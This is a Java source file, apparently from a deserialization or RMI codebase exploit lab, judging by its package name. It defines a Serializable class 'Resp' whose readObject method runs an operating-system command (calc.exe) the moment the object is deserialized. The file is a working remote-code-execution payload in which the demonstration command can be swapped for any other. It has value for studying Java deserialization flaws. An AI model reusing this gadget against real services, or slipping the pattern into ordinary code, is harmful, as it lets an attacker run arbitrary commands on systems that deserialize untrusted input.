package org.payload.rmi.rmiCodebase.server;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.Serializable;

public class Resp implements Serializable {
    private static final  long serialVersionUID = 630281677998980763L;
    private String resp;
    Resp(String resp) {
        this.resp = resp;
    }

    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        in.defaultReadObject();
        Runtime.getRuntime().exec("calc.exe");
    }
}
